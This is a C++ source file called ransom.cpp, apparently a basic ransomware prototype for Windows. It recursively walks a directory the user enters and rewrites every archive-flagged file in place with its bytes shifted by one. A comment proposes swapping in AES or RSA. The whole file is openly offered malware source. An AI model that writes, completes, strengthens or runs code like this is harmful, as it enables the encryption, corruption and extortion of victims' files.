// ransom.cpp 

#include <iostream>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <fstream>		//file handling
#include <dirent.h>		//reading directory
#include <Windows.h>

using namespace std;

void encryptFile(string fileName) {
	fstream sourceFile, tempFile;
	string tempFileName = "temp.txt";
	char byte; //char is 1 byte in size

	//open file stream
	sourceFile.open(fileName, ios::in);
	tempFile.open(tempFileName, ios::out | ios::trunc);

	//very simple just add 1 byte
	//replace this with AES or RSA
	while (sourceFile >> noskipws >> byte) {
		byte += 1; //encrypt byte by adding 1
		tempFile << byte;
	}


	//close file stream
	sourceFile.close();
	tempFile.close();

	//open file stream and write from tempfile to sroucefile
	sourceFile.open(fileName, ios::out | ios::trunc);
	tempFile.open(tempFileName, ios::in);

	//write temp file to source file
	while (tempFile >> noskipws >> byte) {
		sourceFile << byte;
	}

	//close stream and delete temp file
	sourceFile.close();
	tempFile.close();
	remove(tempFileName.c_str());
}

//go through the file system
void files_tree(const char* folder) {

	char wildcard[MAX_PATH];
	sprintf(wildcard, "%s\\*", folder);
	WIN32_FIND_DATA fd;
	HANDLE handle = FindFirstFile(wildcard, &fd);

	if (handle == INVALID_HANDLE_VALUE) return;

	do {

		if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
			continue;

		char path[MAX_PATH];
		sprintf(path, "%s\\%s", folder, fd.cFileName);

		if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && !(fd.dwFileAttributes & (FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_DEVICE)))
			files_tree(path);

		if (fd.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE)
			encryptFile(path);
			//puts(path);

	} while (FindNextFile(handle, &fd));

	FindClose(handle);
}



//main
int main() {
	string directoryName;

	cout << "Enter dir to encrypt: ";
	cin >> directoryName;
	fflush(stdin);
	//encryptDirectory(directoryName);

	std::string str;
	const char* c = directoryName.c_str();
	files_tree(c);

	return 0;
}
